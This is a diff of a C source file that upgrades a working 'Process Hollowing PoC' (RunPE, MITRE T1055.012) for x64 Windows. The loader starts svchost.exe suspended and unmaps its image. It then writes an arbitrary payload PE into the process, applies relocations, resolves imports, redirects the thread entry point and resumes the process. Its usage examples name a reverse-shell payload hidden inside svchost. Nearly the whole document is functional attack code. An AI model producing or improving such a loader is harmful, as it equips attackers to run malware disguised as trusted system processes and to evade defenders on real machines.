@@ -1,173 +1,230 @@
 /*
- * Process Hollowing (RunPE) — Create a suspended process, hollow it, inject payload
+ * Process Hollowing (RunPE)
  *
  * MITRE ATT&CK: T1055.012 — Process Hollowing
- * Severity: HIGH
  *
- * Technique:
- *   1. Create a legitimate process (e.g., svchost.exe) in SUSPENDED state
- *   2. Unmap its image from memory (NtUnmapViewOfSection)
- *   3. Allocate new memory and write our payload PE
- *   4. Fix the PEB and thread context to point to our entry
- *   5. Resume the thread — our code runs as the legitimate process
+ * Chain:
+ *   CreateProcessA(host, CREATE_SUSPENDED)
+ *   -> read PEB.ImageBaseAddress of host
+ *   -> NtUnmapViewOfSection host image
+ *   -> VirtualAllocEx at payload ImageBase (or any address)
+ *   -> WriteProcessMemory(headers + each section)
+ *   -> apply base relocations if we didn't land at preferred base
+ *   -> resolve payload's import table (walk each DLL, GetProcAddress each
+ *      function, write to IAT)
+ *   -> patch PEB.ImageBaseAddress to new base
+ *   -> SetThreadContext RIP = new_base + AddressOfEntryPoint
+ *   -> ResumeThread
  *
  * Compile:
- *   x86_64-w64-mingw32-gcc -o hollow.exe process_hollowing.c -lntdll
- *   cl process_hollowing.c /Fe:hollow.exe ntdll.lib
+ *   x86_64-w64-mingw32-gcc -o hollow.exe process_hollowing.c
+ *   cl process_hollowing.c /Fe:hollow.exe
  *
  * Usage:
- *   hollow.exe <path_to_payload_exe> [host_process]
- *   hollow.exe calc.exe                           (hollow svchost with calc)
- *   hollow.exe C:\payloads\revshell.exe svchost   (hollow svchost with revshell)
+ *   hollow.exe <payload.exe> [host_process]
+ *   hollow.exe calc.exe
+ *   hollow.exe revshell.exe svchost.exe
+ *
+ * Payload must be an x64 PE. For 32-bit payloads use a 32-bit host and
+ * swap all the x64 context code for Ebx/Eax.
  */
 
 #include <windows.h>
+#include <winternl.h>
 #include <stdio.h>
+#include <string.h>
 
-typedef LONG NTSTATUS;
-#define STATUS_SUCCESS 0
+typedef NTSTATUS (NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
 
-typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
+
+/* Apply base relocations to the mapped image in our local staging buffer.
+ * delta = (actual base allocated in target) - (payload's preferred ImageBase).
+ */
+static void apply_relocations(BYTE* image, IMAGE_NT_HEADERS* nh, ULONGLONG delta) {
+    if (delta == 0) return;
+
+    IMAGE_DATA_DIRECTORY* dir = &nh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    if (dir->Size == 0) return;
+
+    IMAGE_BASE_RELOCATION* r = (IMAGE_BASE_RELOCATION*)(image + dir->VirtualAddress);
+    while (r->VirtualAddress) {
+        DWORD count = (r->SizeOfBlock - sizeof(*r)) / sizeof(WORD);
+        WORD* entries = (WORD*)(r + 1);
+        for (DWORD k = 0; k < count; ++k) {
+            WORD type   = entries[k] >> 12;
+            WORD offset = entries[k] & 0xFFF;
+            if (type == IMAGE_REL_BASED_DIR64) {
+                *(ULONGLONG*)(image + r->VirtualAddress + offset) += delta;
+            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
+                *(DWORD*)(image + r->VirtualAddress + offset) += (DWORD)delta;
+            }
+        }
+        r = (IMAGE_BASE_RELOCATION*)((BYTE*)r + r->SizeOfBlock);
+    }
+}
+
+
+/* Resolve the payload's import table. We call LoadLibraryA/GetProcAddress
+ * on OUR side because kernel32 lives at the same base in every process
+ * on the same OS boot - the resolved addresses are valid in the target. */
+static void resolve_imports(BYTE* image, IMAGE_NT_HEADERS* nh) {
+    IMAGE_DATA_DIRECTORY* dir = &nh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    if (dir->Size == 0) return;
+
+    IMAGE_IMPORT_DESCRIPTOR* iid = (IMAGE_IMPORT_DESCRIPTOR*)(image + dir->VirtualAddress);
+    while (iid->Name) {
+        const char* dllName = (const char*)(image + iid->Name);
+        HMODULE mod = LoadLibraryA(dllName);
+        if (!mod) { iid++; continue; }
+
+        IMAGE_THUNK_DATA* oit = (IMAGE_THUNK_DATA*)(image + iid->OriginalFirstThunk);
+        IMAGE_THUNK_DATA* it  = (IMAGE_THUNK_DATA*)(image + iid->FirstThunk);
+
+        while (oit->u1.AddressOfData) {
+            FARPROC addr;
+            if (oit->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
+                addr = GetProcAddress(mod, (LPCSTR)(oit->u1.Ordinal & 0xFFFF));
+            } else {
+                IMAGE_IMPORT_BY_NAME* name = (IMAGE_IMPORT_BY_NAME*)(image + oit->u1.AddressOfData);
+                addr = GetProcAddress(mod, name->Name);
+            }
+            it->u1.Function = (ULONGLONG)addr;
+            oit++; it++;
+        }
+        iid++;
+    }
+}
+
 
 int main(int argc, char* argv[]) {
     if (argc < 2) {
         printf("Process Hollowing PoC\n");
-        printf("Usage: %s <payload.exe> [host_process]\n", argv[0]);
+        printf("Usage: %s <payload.exe> [host.exe]\n", argv[0]);
         printf("  %s calc.exe\n", argv[0]);
         printf("  %s revshell.exe svchost.exe\n", argv[0]);
         return 1;
     }
 
-    char* payloadPath = argv[1];
-    char* hostProcess = argc > 2 ? argv[2] : "svchost.exe";
+    const char* payloadPath = argv[1];
+    const char* hostName    = argc > 2 ? argv[2] : "svchost.exe";
 
-    // Resolve host process path
     char hostPath[MAX_PATH];
-    if (strchr(hostProcess, '\\') || strchr(hostProcess, '/')) {
-        strncpy(hostPath, hostProcess, MAX_PATH);
+    if (strchr(hostName, '\\')) {
+        strncpy_s(hostPath, MAX_PATH, hostName, _TRUNCATE);
     } else {
-        snprintf(hostPath, MAX_PATH, "C:\\Windows\\System32\\%s", hostProcess);
+        snprintf(hostPath, MAX_PATH, "C:\\Windows\\System32\\%s", hostName);
     }
 
-    printf("[*] Process Hollowing PoC\n");
-    printf("[*] Host: %s\n", hostPath);
-    printf("[*] Payload: %s\n", payloadPath);
+    printf("[*] Host    : %s\n", hostPath);
+    printf("[*] Payload : %s\n", payloadPath);
 
-    // Step 1: Read payload PE into memory
-    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ,
-        NULL, OPEN_EXISTING, 0, NULL);
+    /* --- read payload into a local buffer --- */
+    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL,
+                               OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        printf("[-] Cannot open payload: %s (error %lu)\n", payloadPath, GetLastError());
+        printf("[-] CreateFile(payload) failed (%lu)\n", GetLastError());
         return 1;
     }
-
-    DWORD payloadSize = GetFileSize(hFile, NULL);
-    BYTE* payloadBuf = (BYTE*)VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    DWORD bytesRead;
-    ReadFile(hFile, payloadBuf, payloadSize, &bytesRead, NULL);
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    BYTE* file = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    DWORD read = 0;
+    ReadFile(hFile, file, fileSize, &read, NULL);
     CloseHandle(hFile);
-    printf("[+] Payload read: %lu bytes\n", bytesRead);
 
-    // Validate PE
-    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)payloadBuf;
-    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-        printf("[-] Invalid PE file\n");
-        return 1;
-    }
-    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(payloadBuf + dosHeader->e_lfanew);
-    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
-        printf("[-] Invalid PE signature\n");
-        return 1;
+    IMAGE_DOS_HEADER* dh = (IMAGE_DOS_HEADER*)file;
+    if (dh->e_magic != IMAGE_DOS_SIGNATURE) { printf("[-] Bad DOS header\n"); return 1; }
+    IMAGE_NT_HEADERS* nh = (IMAGE_NT_HEADERS*)(file + dh->e_lfanew);
+    if (nh->Signature != IMAGE_NT_SIGNATURE) { printf("[-] Bad NT header\n"); return 1; }
+
+    DWORD imgSize   = nh->OptionalHeader.SizeOfImage;
+    ULONGLONG prefBase = nh->OptionalHeader.ImageBase;
+    printf("[+] SizeOfImage=%lu, preferred base=0x%llx\n", imgSize, prefBase);
+
+    /* --- stage mapped image in a local buffer first --- */
+    BYTE* local = (BYTE*)VirtualAlloc(NULL, imgSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    memset(local, 0, imgSize);
+    memcpy(local, file, nh->OptionalHeader.SizeOfHeaders);
+
+    IMAGE_NT_HEADERS* nhLocal = (IMAGE_NT_HEADERS*)(local + dh->e_lfanew);
+    IMAGE_SECTION_HEADER* sh = IMAGE_FIRST_SECTION(nhLocal);
+    for (int i = 0; i < nhLocal->FileHeader.NumberOfSections; ++i) {
+        if (sh[i].SizeOfRawData) {
+            memcpy(local + sh[i].VirtualAddress,
+                   file  + sh[i].PointerToRawData,
+                   sh[i].SizeOfRawData);
+        }
     }
 
-    // Step 2: Create host process in SUSPENDED state
+    /* --- spawn host suspended --- */
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi;
-
     if (!CreateProcessA(hostPath, NULL, NULL, NULL, FALSE,
-        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        printf("[-] CreateProcess failed for %s (error %lu)\n", hostPath, GetLastError());
+                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        printf("[-] CreateProcess(%s) failed (%lu)\n", hostPath, GetLastError());
         return 1;
     }
-    printf("[+] Created suspended process: PID %lu, TID %lu\n", pi.dwProcessId, pi.dwThreadId);
+    printf("[+] Spawned suspended: PID %lu, TID %lu\n", pi.dwProcessId, pi.dwThreadId);
 
-    // Step 3: Get the PEB and image base of the host
-    CONTEXT ctx;
-    ctx.ContextFlags = CONTEXT_FULL;
+    /* --- read host's PEB.ImageBaseAddress (x64) --- */
+    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
     GetThreadContext(pi.hThread, &ctx);
+    ULONGLONG hostImageBase = 0;
+    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
+                      &hostImageBase, sizeof(hostImageBase), NULL);
+    printf("[+] Host image base: 0x%llx\n", hostImageBase);
 
-#ifdef _WIN64
-    ULONGLONG imageBase;
-    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &imageBase, sizeof(imageBase), NULL);
-    printf("[+] Host image base: 0x%llx\n", imageBase);
-#else
-    DWORD imageBase;
-    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &imageBase, sizeof(imageBase), NULL);
-    printf("[+] Host image base: 0x%lx\n", imageBase);
-#endif
-
-    // Step 4: Unmap the host's image
+    /* --- unmap host image --- */
     pNtUnmapViewOfSection NtUnmapViewOfSection =
         (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
-
-    NtUnmapViewOfSection(pi.hProcess, (PVOID)imageBase);
+    NtUnmapViewOfSection(pi.hProcess, (PVOID)hostImageBase);
     printf("[+] Unmapped host image\n");
 
-    // Step 5: Allocate memory at the payload's preferred base
-    PVOID remoteBase = VirtualAllocEx(pi.hProcess,
-        (PVOID)ntHeaders->OptionalHeader.ImageBase,
-        ntHeaders->OptionalHeader.SizeOfImage,
-        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-    if (!remoteBase) {
-        // Try at any address if preferred base is taken
-        remoteBase = VirtualAllocEx(pi.hProcess, NULL,
-            ntHeaders->OptionalHeader.SizeOfImage,
-            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    /* --- try to allocate at payload's preferred base, fall back to any --- */
+    PVOID remote = VirtualAllocEx(pi.hProcess, (PVOID)prefBase,
+        imgSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remote) {
+        remote = VirtualAllocEx(pi.hProcess, NULL,
+            imgSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     }
-
-    if (!remoteBase) {
-        printf("[-] VirtualAllocEx failed\n");
+    if (!remote) {
+        printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError());
         TerminateProcess(pi.hProcess, 1);
         return 1;
     }
-    printf("[+] Allocated %lu bytes at 0x%p\n", ntHeaders->OptionalHeader.SizeOfImage, remoteBase);
+    ULONGLONG delta = (ULONGLONG)remote - prefBase;
+    printf("[+] Allocated %lu bytes @ %p (delta=0x%llx)\n", imgSize, remote, delta);
 
-    // Step 6: Write PE headers
-    WriteProcessMemory(pi.hProcess, remoteBase, payloadBuf,
-        ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
+    /* --- fix relocations in local staging buffer (easier than reaching
+         into target repeatedly), then fix imports --- */
+    apply_relocations(local, nhLocal, delta);
+    printf("[+] Base relocations applied\n");
+    resolve_imports(local, nhLocal);
+    printf("[+] Imports resolved\n");
 
-    // Step 7: Write PE sections
-    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);
-    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-        if (sections[i].SizeOfRawData > 0) {
-            WriteProcessMemory(pi.hProcess,
-                (BYTE*)remoteBase + sections[i].VirtualAddress,
-                payloadBuf + sections[i].PointerToRawData,
-                sections[i].SizeOfRawData, NULL);
-        }
-    }
-    printf("[+] Written %d sections\n", ntHeaders->FileHeader.NumberOfSections);
+    /* --- blast the fixed-up image into the target --- */
+    SIZE_T written = 0;
+    WriteProcessMemory(pi.hProcess, remote, local, imgSize, &written);
+    printf("[+] Wrote %zu bytes to target\n", written);
 
-    // Step 8: Update PEB image base
-#ifdef _WIN64
-    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &remoteBase, sizeof(remoteBase), NULL);
-    ctx.Rcx = (ULONGLONG)remoteBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
-#else
-    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &remoteBase, sizeof(remoteBase), NULL);
-    ctx.Eax = (DWORD)remoteBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
-#endif
+    /* --- patch PEB.ImageBaseAddress to new base --- */
+    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
+                       &remote, sizeof(remote), NULL);
 
-    // Step 9: Set thread context and resume
+    /* --- point RCX at new entry point (RtlUserThreadStart reads RCX as
+         the thread entry on x64) --- */
+    ctx.Rcx = (ULONGLONG)remote + nhLocal->OptionalHeader.AddressOfEntryPoint;
     SetThreadContext(pi.hThread, &ctx);
+    printf("[+] RIP target: %p + AddressOfEntryPoint = 0x%llx\n",
+           remote, (ULONGLONG)ctx.Rcx);
+
+    /* --- go --- */
     ResumeThread(pi.hThread);
+    printf("[+] Hollowed. Payload now running as %s PID %lu.\n",
+           hostName, pi.dwProcessId);
 
-    printf("[+] Process hollowed and resumed!\n");
-    printf("[+] Payload running inside %s (PID %lu)\n", hostProcess, pi.dwProcessId);
-
-    VirtualFree(payloadBuf, 0, MEM_RELEASE);
+    VirtualFree(local, 0, MEM_RELEASE);
+    VirtualFree(file,  0, MEM_RELEASE);
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
-
     return 0;
 }
